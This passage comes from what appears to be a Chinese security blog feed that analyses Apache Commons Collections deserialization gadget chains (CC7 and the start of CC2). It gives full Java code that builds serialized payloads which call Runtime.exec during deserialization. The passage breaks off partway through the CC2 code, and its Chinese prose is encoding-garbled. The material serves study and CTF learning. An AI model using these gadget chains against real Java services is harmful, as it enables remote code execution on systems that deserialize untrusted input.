class="string">&quot;zZ&quot;</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Hashtable&lt;Map&lt;?,?&gt;, Integer&gt; hashtable = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        hashtable.put(lazyMap1,<span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        serialize(hashtable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;cc7.ser&quot;</span>)));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(<span class="string">&quot;cc7.ser&quot;</span>)));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°è¯•è¿è¡Œï¼Œå¹¶æ²¡æœ‰åœ¨ååºåˆ—åŒ–æ—¶å¼¹å‡ºè®¡ç®—å™¨ï¼Œè°ƒè¯•ä¸­å‘ç°åœ¨ä½¿ç”¨<code>put()</code>å‘<code>hashTable</code>ä¼ é€’<code>lazyMap2</code>æ—¶è°ƒç”¨äº†<code>equals()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">        <span class="comment">// Make sure the value is not null</span></span><br><span class="line">        <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">        Entry&lt;?,?&gt; tab[] = table;</span><br><span class="line">        <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> key.hashCode();</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        Entry&lt;K,V&gt; entry = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">        <span class="keyword">for</span>(; entry != <span class="literal">null</span> ; entry = entry.next) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((entry.hash == hash) &amp;&amp; entry.key.equals(key)) &#123;</span><br><span class="line">                <span class="type">V</span> <span class="variable">old</span> <span class="operator">=</span> entry.value;</span><br><span class="line">                entry.value = value;</span><br><span class="line">                <span class="keyword">return</span> old;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œ<code>equals()</code>æ¯”è¾ƒçš„æ˜¯ä¸¤ä¸ªä¸ä¸€æ ·çš„<code>LazyMap</code></p><p><img src="/img/post/image-20260113115652321.png" alt="image-20260113115652321"></p><p><code>lazyMap1</code>æ²¡æœ‰é‡å†™<code>equals()</code>ï¼Œè°ƒç”¨çš„å®é™…æ˜¯çˆ¶ç±»<code>AbstractMapDecorator</code>çš„<code>equals()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> object == <span class="built_in">this</span> ? <span class="literal">true</span> : <span class="built_in">this</span>.map.equals(object);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„<code>this.map</code>æ˜¯åœ¨<code>decorate()</code>æ—¶ä¼ å…¥çš„<code>hashmap1</code>ï¼Œåœ¨<code>decorate()</code>ä¸­</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨äº†æ„é€ å™¨ï¼Œè€Œåœ¨æ„é€ å™¨ä¸­</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Factory factory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.factory = FactoryTransformer.getInstance(factory);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨äº†çˆ¶ç±»çš„æ„é€ å™¨ï¼Œçœ‹çˆ¶ç±»æ„é€ å™¨</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">AbstractMapDecorator</span><span class="params">(Map map)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (map == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Map must not be null&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.map = map;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ä¼ å…¥äº†<code>hashmap1</code>ï¼Œæ•…<code>lazyMap</code>çš„<code>map</code>å­—æ®µå°±æ˜¯<code>hashmap1</code>ï¼Œè¿›å…¥<code>HashMap</code>ä¸­çš„<code>equals()</code>ï¼Œå…¶å®<code>HashMap</code>ä¹Ÿæ²¡æœ‰é‡å†™<code>equals()</code>ï¼Œç”¨çš„æ˜¯çˆ¶ç±»<code>AbstractMap</code>çš„</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="built_in">this</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Map))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</span><br><span class="line">        <span class="keyword">if</span> (m.size() != size())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">            <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line">                Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line">                <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!value.equals(m.get(key)))</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassCastException unused) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NullPointerException unused) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯¹<code>hashMap1</code>è¿›è¡Œäº†è¿­ä»£ï¼Œå¹¶å°è¯•ä¸<code>lazyMap2</code>è¿›è¡Œæ¯”è¾ƒï¼Œæ‰€ä»¥å¯¹<code>lazyMap2</code>è°ƒç”¨äº†<code>get()</code>ï¼Œå†æ­¥å…¥</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);</span><br><span class="line">            <span class="built_in">super</span>.map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.map.get(key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è°ƒè¯•æ˜¾ç¤º<code>key</code>æ˜¯<code>yy</code>ï¼Œè¿™æ˜¾ç„¶ä¸å­˜åœ¨äº<code>super.map</code>å­—æ®µä¹Ÿå°±æ˜¯<code>hashmap2</code>é‡Œçš„ï¼Œæ‰€ä»¥è¿›å…¥äº†ifä»£ç å—ï¼Œåˆå¾€<code>hashMpa2</code>è°ƒç”¨äº†<code>put()</code>ï¼Œè¡¨ç°ä¸º<code>lazyMap2</code>å¤šäº†ä¸€ä¸ªé”®ä¸º<code>yy</code>ï¼Œå€¼ä¸ºä¸€ä¸ª<code>ProcessImpl</code>å¯¹è±¡çš„é”®å€¼å¯¹ï¼Œä½†æ˜¯åœ¨ååºåˆ—åŒ–æ—¶è¦å¯¹<code>lazyMap2</code>å’Œ<code>lazyMap1</code>è¿›è¡Œé•¿åº¦æ¯”è¾ƒï¼Œå¦‚æœä¸åŒ¹é…å°±ä¼šé˜»æ­¢åé¢çš„å‘½ä»¤æ‰§è¡Œï¼Œæ‰€ä»¥åœ¨<code>put()</code>åè¿˜éœ€è¦å¯¹å¤šå‡ºæ¥çš„é”®å€¼å¯¹è¿›è¡Œæ¸…é™¤</p><p>å…¨é“¾å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;?,?&gt; hashMap1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(hashMap1,chainedTransformer);</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;yy&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        HashMap&lt;?,?&gt; hashMap2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(hashMap2,chainedTransformer);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;zZ&quot;</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Hashtable&lt;Map&lt;?,?&gt;, Integer&gt; hashtable = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        hashtable.put(lazyMap1,<span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2,<span class="number">1</span>);</span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        serialize(hashtable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;cc7.ser&quot;</span>)));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(<span class="string">&quot;cc7.ser&quot;</span>)));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>CCé“¾å°±æ­¤å°±è®²å®Œäº†ï¼Œå®Œç»“æ’’èŠ±*â˜…,Â°<em>:.â˜†(ï¿£â–½ï¿£)&#x2F;$:</em>.Â°â˜…* </p><br/>]]></content>
      
      
      <categories>
          
          <category> CTFç›¸å…³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollections2ååºåˆ—åŒ–é“¾ç®€æ</title>
      <link href="/2025/12/22/CommonsCollections2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E7%AE%80%E6%9E%90/"/>
      <url>/2025/12/22/CommonsCollections2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E7%AE%80%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonsCollections2ååºåˆ—åŒ–é“¾ç®€æ"><a href="#CommonsCollections2ååºåˆ—åŒ–é“¾ç®€æ" class="headerlink" title="CommonsCollections2ååºåˆ—åŒ–é“¾ç®€æ"></a>CommonsCollections2ååºåˆ—åŒ–é“¾ç®€æ</h1><p>JDK 8u71ç‰ˆæœ¬ä»¥åï¼Œå¯¹<code>AnnotationInvocationHandler</code>ç±»çš„<code>readObject()</code>è¿›è¡Œäº†ä¿®å¤ï¼Œæ­¤åä¸å†è°ƒç”¨<code>setValue()</code>æ–¹æ³•ã€‚é’ˆå¯¹<code>LazyMap</code>è·¯å¾„ï¼Œåˆ›å»ºæ–°çš„<code>LinkedHashMap</code>æ›¿æ¢åŸæœ¬ä¼ å…¥çš„<code>proxyMap</code>ä½œä¸º<code>memberValues</code>å­—æ®µï¼Œä¸å†ç›´æ¥å¯¹åŸæœ¬æ„é€ çš„<code>proxyMap</code>è¿›è¡Œ<code>EntrySet()</code>æ“ä½œ</p><br/><h2 id="ä¾èµ–ChainedTransformerçš„CC2é“¾æ„å»ºè·¯å¾„"><a href="#ä¾èµ–ChainedTransformerçš„CC2é“¾æ„å»ºè·¯å¾„" class="headerlink" title="ä¾èµ–ChainedTransformerçš„CC2é“¾æ„å»ºè·¯å¾„"></a>ä¾èµ–ChainedTransformerçš„CC2é“¾æ„å»ºè·¯å¾„</h2><p>è¯¥è·¯å¾„ä¾ç„¶åˆ©ç”¨<code>ChainedTransformer</code>ç±»çš„<code>transform()</code>æ–¹æ³•è¿›è¡Œé“¾å¼è°ƒç”¨ï¼Œä¸CC1çš„ä¸åŒç‚¹åœ¨äºè§¦å‘<code>transform()</code>æ–¹æ³•çš„ä¸Šå±‚æ˜¯<code>TransformingComparator</code>ç±»çš„<code>compare()</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(I obj1, I obj2)</span> &#123;</span><br><span class="line">        <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> (O)<span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">        <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> (O)<span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>TransformingComparator</code>çš„æ„é€ å™¨æ˜¯å…¬å¼€æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TransformingComparator</span><span class="params">(Transformer&lt;? <span class="built_in">super</span> I, ? extends O&gt; transformer)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(transformer, ComparatorUtils.NATURAL_COMPARATOR);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">TransformingComparator</span><span class="params">(Transformer&lt;? <span class="built_in">super</span> I, ? extends O&gt; transformer, Comparator&lt;O&gt; decorated)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.decorated = decorated;</span><br><span class="line">        <span class="built_in">this</span>.transformer = transformer;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥æ„é€ å³å¯ï¼Œæ­¤æ—¶çš„é“¾ä¾¿å¯æ”¹å†™ä¸ºå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);</span><br><span class="line">transformingComparator.compare(<span class="number">1</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ä¼šæŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ï¼Œæ˜¯è¿”å›å€¼ç±»å‹ä¸åŒ¹é…çš„åŸå› ï¼Œä½†æ­¤æ—¶å‘½ä»¤å·²ç»æ‰§è¡Œå®Œæ¯•äº†ï¼Œ<del>æ•…å½±å“ä¸å¤§</del>ï¼ˆåé¢ç«‹å³æ‰“è„¸ï¼‰ï¼Œç»§ç»­å¯»æ‰¾ä¸Šå±‚ï¼Œåœ¨<code>PriorityQueue</code>ç±»çš„<code>siftDownUsingComparator()</code>æ–¹æ³•è°ƒç”¨äº†<code>compare()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftUpUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (k &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">parent</span> <span class="operator">=</span> (k - <span class="number">1</span>) &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">e</span> <span class="operator">=</span> queue[parent];</span><br><span class="line">            <span class="keyword">if</span> (comparator.compare(x, (E) e) &gt;= <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            queue[k] = e;</span><br><span class="line">            k = parent;</span><br><span class="line">        &#125;</span><br><span class="line">        queue[k] = x;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>siftDownUsingComparator()</code>è¢«åŒä¸€ä¸ªç±»çš„<code>siftDown()</code>æ–¹æ³•è°ƒç”¨</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (comparator != <span class="literal">null</span>)</span><br><span class="line">            siftDownUsingComparator(k, x);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            siftDownComparable(k, x);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>siftDown()</code>è¢«åŒä¸€ä¸ªç±»çš„<code>heapify()</code>è°ƒç”¨</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">            siftDown(i, (E) queue[i]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>heapify()</code>è¢«åˆ™<code>readObject()</code>è°ƒç”¨äº†</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">        s.readInt();</span><br><span class="line"></span><br><span class="line">        queue = <span class="keyword">new</span> <span class="title class_">Object</span>[size];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read in all elements.</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">            queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span></span><br><span class="line">        <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">        heapify();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æ„é€ é“¾çš„èµ·ç‚¹åœ¨<code>PriorityQueue</code>ç±»ï¼Œç±»å†…éƒ¨çš„è°ƒç”¨é¡ºåºæ˜¯<code>readObject()</code>-&gt;<code>heapify()</code>-&gt;<code>siftDown()</code>-&gt;<code>siftDownUsingComparator()</code>-&gt;<code>compare()</code></p><p>æˆ‘ä»¬éœ€è¦<code>comparator</code>ä¸ºæ„é€ å¥½çš„<code>transformingComparator</code>å¯¹è±¡ç”¨æ¥è§¦å‘<code>compare()</code>ï¼Œåœ¨PriorityQueueç±»å†…çš„ä¸€ä¸ªå…¬å¼€æ„é€ å™¨å¯ä»¥ç›´æ¥èµ‹å€¼<code>comparator</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">PriorityQueue</span><span class="params">(Comparator&lt;? <span class="built_in">super</span> E&gt; comparator)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(DEFAULT_INITIAL_CAPACITY, comparator);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ­¤å¤–åœ¨<code>heapify()</code>æ–¹æ³•ä¸­ï¼Œè¦è¿›å…¥forå¾ªç¯çš„æ¡ä»¶æ˜¯<code>size</code>&gt;&#x3D;2</p><blockquote><p><code>size &gt;&gt;&gt; 1</code>   size é™¤ä»¥ 2<br><code>(size &gt;&gt;&gt; 1) - 1</code>   ç»“æœå‡ 1<br><code>i &gt;= 0</code>   å¾ªç¯ç»§ç»­æ¡ä»¶</p></blockquote><p>æ‰€ä»¥æˆªæ­¢ç›®å‰ï¼Œé“¾çš„æ ·å­å·²ç»å‡ ä¹å®Œæ•´äº†</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);</span><br><span class="line">        PriorityQueue&lt;Integer&gt; priorityQueue = <span class="keyword">new</span> <span class="title 